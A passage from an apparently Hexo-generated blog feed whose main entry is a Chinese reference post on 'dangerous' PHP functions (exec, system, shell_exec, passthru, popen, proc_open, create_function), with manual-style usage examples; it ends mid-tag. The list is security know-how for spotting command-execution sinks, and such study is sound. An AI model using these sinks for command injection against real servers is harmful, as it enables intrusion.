class="keyword">except</span> ReadTimeout:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Timeout&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;python的requests模块&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;requset模块&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;requests模块是python中常用的写网页爬虫程序的包，requests可以发送HTTP请求，并获取请求状态及请求内</summary>
      
    
    
    
    <category term="基础语言" scheme="https://sinevil.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="Python" scheme="https://sinevil.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>php常见危险函数（持续）</title>
    <link href="https://sinevil.github.io/2021/08/08/php%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/"/>
    <id>https://sinevil.github.io/2021/08/08/php%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/</id>
    <published>2021-08-08T11:12:26.000Z</published>
    <updated>2021-08-13T02:49:16.032Z</updated>
    
    <content type="html"><![CDATA[<p><strong>php常见危险函数</strong></p><ul><li>phpinfo()</li></ul><p>输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP环境变量、操作系统版本信息、path 变量、配置选项的本地值和主值、HTTP 头和PHP授权信息(License)。</p><p><strong>exec</strong></p><ul><li><p>用法：</p><p>执行一个外部程序</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">array</span> &amp;<span class="variable">$output</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ]] ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure><ul><li>参数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span>    <span class="comment">#要执行的命令。</span></span><br><span class="line"></span><br><span class="line">output    <span class="comment">#如果提供了 output 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 数组中的数据不包含行尾的空白字符，例如 \n 字符。 请注意，如果数组中已经包含了部分元素，exec() 函数会在数组末尾追加内容。如果你不想在数组末尾进行追加， 请在传入 exec() 函数之前 对数组使用 unset() 函数进行重置。</span></span><br><span class="line"></span><br><span class="line">return_var   <span class="comment">#如果同时提供 output 和 return_var 参数， 命令执行后的返回状态会被写入到此变量。</span></span><br></pre></td></tr></table></figure><ul><li>返回值<br>命令执行结果的最后一行内容。 如果你需要获取未经处理的全部输出数据， 请使用 passthru() 函数。</li></ul><p>如果想要获取命令的输出内容， 请确保使用 output 参数。</p><ul><li>示例</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// 输出运行中的 php/httpd 进程的创建者用户名</span></span><br><span class="line">  <span class="comment">// （在可以执行 &quot;whoami&quot; 命令的系统上）</span></span><br><span class="line">  <span class="keyword">echo</span> exec(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>system</strong></p><ul><li><p>用法：</p><p>执行外部程序，并且显示输出</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ] ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>同 C 版本的 system() 函数一样， 本函数执行 command 参数所指定的命令， 并且输出执行结果。</p><p>如果 PHP 运行在服务器模块中， system() 函数还会尝试在每行输出完毕之后， 自动刷新 web 服务器的输出缓存。</p><p>如果要获取一个命令未经任何处理的 原始输出， 请使用 passthru() 函数。</p><ul><li>参数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span><span class="comment">#要执行的命令。</span></span><br><span class="line"></span><br><span class="line">return_var<span class="comment">#如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。</span></span><br></pre></td></tr></table></figure><ul><li><p>返回值<br>成功则返回命令输出的最后一行， 失败则返回 FALSE</p></li><li><p>示例</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">// 输出 shell 命令 &quot;ls&quot; 的返回结果</span></span><br><span class="line"><span class="comment">// 并且将输出的最后一样内容返回到 $last_line。</span></span><br><span class="line"><span class="comment">// 将命令的返回值保存到 $retval。</span></span><br><span class="line"><span class="variable">$last_line</span> = system(<span class="string">&#x27;ls&#x27;</span>, <span class="variable">$retval</span>);</span><br><span class="line"><span class="comment">// 打印更多信息</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">&lt;hr /&gt;Last line of the output: &#x27;</span> . <span class="variable">$last_line</span> . <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;hr /&gt;Return value: &#x27;</span> . <span class="variable">$retval</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>shell_exec</strong></p><ul><li>用法：</li></ul><p>通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">shell_exec ( <span class="keyword">string</span> <span class="variable">$cmd</span> ) : <span class="keyword">string</span> </span><br><span class="line"></span><br><span class="line">本函数同 `执行操作符`</span><br><span class="line"></span><br><span class="line">&gt; PHP 支持一个执行运算符：反引号（``）。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符“`”的效果与函数 shell_exec() 相同。</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="meta">&lt;?php</span></span><br><span class="line">&gt; <span class="variable">$output</span> = `ls -al`;</span><br><span class="line">&gt; <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&gt; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">* 参数</span><br><span class="line"></span><br><span class="line">​```bash</span><br><span class="line">cmd  <span class="comment">#要执行的命令</span></span><br></pre></td></tr></table></figure><ul><li>返回值</li></ul><p>命令执行的输出。 如果执行过程中发生错误或者进程不产生输出，则返回 NULL。</p><p>Note:</p><p>当进程执行过程中发生错误，或者进程不产生输出的情况下，都会返回 NULL， 所以，使用本函数无法通过返回值检测进程是否成功执行。 如果需要检查进程执行的退出码，请使用 exec() 函数。</p><ul><li>示例</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = shell_exec(<span class="string">&#x27;ls -lart&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>passthru</strong></p><ul><li>用法</li></ul><p>passthru — 执行外部程序并且显示原始输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passthru ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ] ) : <span class="keyword">void</span></span><br></pre></td></tr></table></figure><p>同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。</p><ul><li>参数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span><span class="comment">#要执行的命令。</span></span><br><span class="line"></span><br><span class="line">return_var<span class="comment">#如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。</span></span><br></pre></td></tr></table></figure><ul><li><p>返回值</p><p>无</p></li></ul><p><strong>popen</strong></p><ul><li>用法</li></ul><p>打开进程文件指针</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popen ( <span class="keyword">string</span> <span class="variable">$command</span> , <span class="keyword">string</span> <span class="variable">$mode</span> ) : resource</span><br></pre></td></tr></table></figure><p>打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。</p><ul><li>参数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span><span class="comment">#命令</span></span><br><span class="line"></span><br><span class="line">mode<span class="comment">#模式</span></span><br></pre></td></tr></table></figure><ul><li>返回值</li></ul><p>返回一个和 fopen() 所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用 pclose() 来关闭。此指针可以用于 fgets()，fgetss() 和 fwrite()。 当模式为 ‘r’，返回的文件指针等于命令的 STDOUT，当模式为 ‘w’，返回的文件指针等于命令的 STDIN。</p><p>如果出错返回 FALSE。</p><ul><li>示例</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$handle </span>= popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#如果未找到要执行的命令，会返回一个合法的资源。这看上去很怪，但有道理。它允许访问 shell 返回的任何错误信息</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 加入重定向以得到标准错误输出 stderr。 */</span></span><br><span class="line"><span class="variable">$handle </span>= popen(<span class="string">&#x27;/path/to/executable 2&gt;&amp;1&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#x27;<span class="subst">$handle</span>&#x27;; &quot;</span> . gettype(<span class="variable">$handle</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$read </span>= fread(<span class="variable">$handle</span>, <span class="number">2096</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$read</span>;</span><br><span class="line">pclose(<span class="variable">$handle</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>proc_open</strong></p><ul><li>用法</li></ul><p>执行一个命令，并且打开用来输入/输出的文件指针。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proc_open ( <span class="keyword">string</span> <span class="variable">$cmd</span> , <span class="keyword">array</span> <span class="variable">$descriptorspec</span> , <span class="keyword">array</span> &amp;<span class="variable">$pipes</span> [, <span class="keyword">string</span> <span class="variable">$cwd</span> = <span class="literal">NULL</span> [, <span class="keyword">array</span> <span class="variable">$env</span> = <span class="literal">NULL</span> [, <span class="keyword">array</span> <span class="variable">$other_options</span> = <span class="literal">NULL</span> ]]] ) : resource</span><br></pre></td></tr></table></figure><p>类似 popen() 函数， 但是 proc_open() 提供了更加强大的控制程序执行的能力</p><ul><li>参数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">cmd<span class="comment">#要执行的命令</span></span><br><span class="line"></span><br><span class="line">descriptorspec<span class="comment">#一个索引数组。 数组的键表示描述符，数组元素值表示 PHP 如何将这些描述符传送至子进程。 0 表示标准输入（stdin），1 表示标准输出（stdout），2 表示标准错误（stderr）。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#数组中的元素可以是：</span></span><br><span class="line">包含了要传送至进程的管道的描述信息。 第一个元素为描述符类型， 第二个元素是针对该描述符的选项。 有效的类型有：pipe （第二个元素可以是： r 向进程传送该管道的读取端，w 向进程传送该管道的写入端）， 以及 file（第二个元素为文件名）。</span><br><span class="line">表达一个真实文件描述符的流资源类型 （例如：已打开的文件，一个 socket 端口，STDIN）。</span><br><span class="line">文件描述符的值不限于 0，1 和 2，你可以使用任何有效的文件描述符 并将其传送至子进程。 这使得你的脚本可以和其他脚本交互操作。 例如，可以通过指定文件描述符将密码以更加安全的方式 传送至诸如 PGP，GPG 和 openssl 程序， 同时也可以很方便的获取这些程序的状态信息。</span><br><span class="line"></span><br><span class="line">pipes<span class="comment">#将被置为索引数组， 其中的元素是被执行程序创建的管道对应到 PHP 这一端的文件指针。</span></span><br><span class="line"></span><br><span class="line">cwd<span class="comment">#要执行命令的初始工作目录。 必须是 绝对 路径， 设置此参数为 NULL 表示使用默认值（当前 PHP 进程的工作目录）。</span></span><br><span class="line"></span><br><span class="line">env<span class="comment">#要执行的命令所使用的环境变量。 设置此参数为 NULL 表示使用和当前 PHP 进程相同的环境变量。</span></span><br><span class="line"></span><br><span class="line">other_options</span><br><span class="line"><span class="comment">#你还可以指定一些附加选项。 目前支持的选项包括：</span></span><br><span class="line">suppress_errors （仅用于 Windows 平台）： <span class="comment">#设置为 TRUE 表示抑制本函数产生的错误。</span></span><br><span class="line">bypass_shell （仅用于 Windows 平台）： <span class="comment">#设置为 TRUE 表示绕过 cmd.exe shell。</span></span><br><span class="line"></span><br><span class="line">* 返回值</span><br><span class="line"></span><br><span class="line">返回表示进程的资源类型， 当使用完毕之后，请调用 proc_close() 函数来关闭此资源。 如果失败，返回 FALSE。</span><br><span class="line"></span><br><span class="line">* 示例</span><br><span class="line"></span><br><span class="line">​```php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$descriptorspec</span> = array(</span><br><span class="line">   0 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  // 标准输入，子进程从此管道中读取数据</span><br><span class="line">   1 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  // 标准输出，子进程向此管道中写入数据</span><br><span class="line">   2 =&gt; array(<span class="string">&quot;file&quot;</span>, <span class="string">&quot;/tmp/error-output.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) // 标准错误，写入到一个文件</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cwd</span> = <span class="string">&#x27;/tmp&#x27;</span>;</span><br><span class="line"><span class="variable">$env</span> = array(<span class="string">&#x27;some_option&#x27;</span> =&gt; <span class="string">&#x27;aeiou&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = proc_open(<span class="string">&#x27;php&#x27;</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>, <span class="variable">$cwd</span>, <span class="variable">$env</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_resource(<span class="variable">$process</span>)) &#123;</span><br><span class="line">    // <span class="variable">$pipes</span> 现在看起来是这样的：</span><br><span class="line">    // 0 =&gt; 可以向子进程标准输入写入的句柄</span><br><span class="line">    // 1 =&gt; 可以从子进程标准输出读取的句柄</span><br><span class="line">    // 错误输出将被追加到文件 /tmp/error-output.txt</span><br><span class="line"></span><br><span class="line">    fwrite(<span class="variable">$pipes</span>[0], <span class="string">&#x27;&lt;?php print_r($_ENV); ?&gt;&#x27;</span>);</span><br><span class="line">    fclose(<span class="variable">$pipes</span>[0]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> stream_get_contents(<span class="variable">$pipes</span>[1]);</span><br><span class="line">    fclose(<span class="variable">$pipes</span>[1]);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    // 切记：在调用 proc_close 之前关闭所有的管道以避免死锁。</span><br><span class="line">    <span class="variable">$return_value</span> = proc_close(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;command returned <span class="variable">$return_value</span>\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">    </span><br><span class="line"><span class="comment">#以上例程的输出类似于：</span></span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [some_option] =&gt; aeiou</span><br><span class="line">    [PWD] =&gt; /tmp</span><br><span class="line">    [SHLVL] =&gt; 1</span><br><span class="line">    [_] =&gt; /usr/<span class="built_in">local</span>/bin/php</span><br><span class="line">)</span><br><span class="line"><span class="built_in">command</span> returned 0</span><br></pre></td></tr></table></figure><p><strong>create_function</strong></p><ul><li>用法：</li></ul><p>创建一个匿名（lambda样式）函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function ( <span class="keyword">string</span> <span class="variable">$args</span> , <span class="keyword">string</span> <span class="variable">$code</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>根据传递的参数创建匿名函数，并为其返回唯一名称。<br>此函数在内部执行eval（），因此具有与eval（）相同的安全问题。此外，它还具有较差的性能和内存使用特性。</p><p>如果您使用的是PHP5.3.0或更新版本，则应使用本机匿名函数。</p><ul><li>参数</li></ul><p>通常，这些参数将作为单引号分隔的字符串传递。使用单引号字符串的原因是为了防止解析变量名，否则，如果使用双引号，则需要转义变量名，例如$avar。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">args <span class="comment">#函数参数。</span></span><br><span class="line"></span><br><span class="line">code <span class="comment">#函数代码。</span></span><br></pre></td></tr></table></figure><ul><li>返回值</li></ul><p>以字符串形式返回唯一的函数名，出错时返回FALSE。</p><ul><li>示例</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用create#u function（）创建匿名函数，您可以使用此函数（例如）根据运行时收集的信息创建函数：</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$newfunc</span> = create_function(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;New anonymous function: <span class="subst">$newfunc</span>\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$newfunc</span>(<span class="number">2</span>, M_E) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="comment">//新的匿名函数：lambda_1</span></span><br><span class="line"><span class="comment">//ln（2）+ln（2.718281828459）=1.6931471805599</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="keyword">Or</span>, perhaps to have general handler <span class="function"><span class="keyword">function</span> <span class="title">that</span> <span class="title">can</span> <span class="title">apply</span> <span class="title">a</span> <span class="title">set</span> <span class="title">of</span> <span class="title">operations</span> <span class="title">to</span> <span class="title">a</span> <span class="title">list</span> <span class="title">of</span> <span class="title">parameters</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#使用<span class="title">create</span>#<span class="title">u</span>函数（）生成通用处理函数</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">process</span>(<span class="params"><span class="variable">$var1</span>, <span class="variable">$var2</span>, <span class="variable">$farr</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$farr</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$f</span>(<span class="variable">$var1</span>, <span class="variable">$var2</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一组数学函数</span></span><br><span class="line"><span class="variable">$f1</span> = <span class="string">&#x27;if ($a &gt;=0) &#123;return &quot;b*a^2 = &quot;.$b*sqrt($a);&#125; else &#123;return false;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$f2</span> = <span class="string">&quot;return \&quot;min(b^2+a, a^2,b) = \&quot;.min(\$a*\$a+\$b,\$b*\$b+\$a);&quot;</span>;</span><br><span class="line"><span class="variable">$f3</span> = <span class="string">&#x27;if ($a &gt; 0 &amp;&amp; $b != 0) &#123;return &quot;ln(a)/b = &quot;.log($a)/$b; &#125; else &#123; return false; &#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$farr</span> = <span class="keyword">array</span>(</span><br><span class="line">    create_function(<span class="string">&#x27;$x,$y&#x27;</span>, <span class="string">&#x27;return &quot;some trig: &quot;.(sin($x) + $x*cos($y));&#x27;</span>),</span><br><span class="line">    create_function(<span class="string">&#x27;$x,$y&#x27;</span>, <span class="string">&#x27;return &quot;a hypotenuse: &quot;.sqrt($x*$x + $y*$y);&#x27;</span>),</span><br><span class="line">    create_function(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="variable">$f1</span>),</span><br><span class="line">    create_function(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="variable">$f2</span>),</span><br><span class="line">    create_function(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="variable">$f3</span>)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\nUsing the first array of anonymous functions\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;parameters: 2.3445, M_PI\n&quot;</span>;</span><br><span class="line">process(<span class="number">2.3445</span>, M_PI, <span class="variable">$farr</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//现在制作一组字符串处理函数</span></span><br><span class="line"><span class="variable">$garr</span> = <span class="keyword">array</span>(</span><br><span class="line">    create_function(<span class="string">&#x27;$b,$a&#x27;</span>, <span class="string">&#x27;if (strncmp($a, $b, 3) == 0) return &quot;** \&quot;$a\&quot; &#x27;</span>.</span><br><span class="line">    <span class="string">&#x27;and \&quot;$b\&quot;\n** Look the same to me! (looking at the first 3 chars)&quot;;&#x27;</span>),</span><br><span class="line">    create_function(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&#x27;; return &quot;CRCs: &quot; . crc32($a) . &quot;, &quot;.crc32($b);&#x27;</span>),</span><br><span class="line">    create_function(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&#x27;; return &quot;similar(a,b) = &quot; . similar_text($a, $b, &amp;$p) . &quot;($p%)&quot;;&#x27;</span>)</span><br><span class="line">    );</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\nUsing the second array of anonymous functions\n&quot;</span>;</span><br><span class="line">process(<span class="string">&quot;Twas brilling and the slithy toves&quot;</span>, <span class="string">&quot;Twas the night&quot;</span>, <span class="variable">$garr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#以上示例会输出：</span></span><br><span class="line"></span><br><span class="line">Using the first <span class="keyword">array</span> of anonymous functions</span><br><span class="line">parameters: <span class="number">2.3445</span>, M_PI</span><br><span class="line">some trig: -<span class="number">1.6291725057799</span></span><br><span class="line">a hypotenuse: <span class="number">3.9199852871011</span></span><br><span class="line">b*a^<span class="number">2</span> = <span class="number">4.8103313314525</span></span><br><span class="line">min(b^<span class="number">2</span>+a, a^<span class="number">2</span>,b) = <span class="number">8.6382729035898</span></span><br><span class="line">ln(a)/b = <span class="number">0.27122299212594</span></span><br><span class="line"></span><br><span class="line">Using the second <span class="keyword">array</span> of anonymous functions</span><br><span class="line">** <span 